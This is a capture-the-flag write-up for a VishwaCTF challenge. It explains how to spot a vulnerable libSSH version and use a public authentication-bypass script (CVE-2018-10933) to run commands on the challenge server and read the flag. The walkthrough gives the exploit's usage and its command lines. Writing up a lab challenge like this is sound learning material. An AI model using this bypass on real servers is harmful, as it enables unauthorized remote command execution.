# Save The City

## Description

The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!

## Introduction

Upon connecting via netcat (`nc`), the server provides the name of the libSSH library. If the output is 0.8.1, 0.7.5, 0.6.*, or lower, the server is vulnerable to CVE-2018-10993 or CVE-2018-10933

### Installation

Clone the code:

```bash
https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
```

### Usage 
 
- Run the exploit script with the appropriate parameters: 

```py
python libsshauthbypass.py <ip> --port <port> --command <command_line>
```

Replace <ip> with the IP address of the vulnerable server, <port> with the port number, and <command_line> with the desired command to execute. 

### Example 

```py
python libsshauthbypass.py 192.168.1.100 --port 22 --command "whoami"
```

This command will exploit the vulnerability on a server with IP address 192.168.1.100 listening on port 22, executing the whoami command.

## Exploit

```py
python exploit.py 13.234.11.113 --port 32176 --command "cat location.txt"
```

> Flag: VishwaCTF{elrow-club-pune}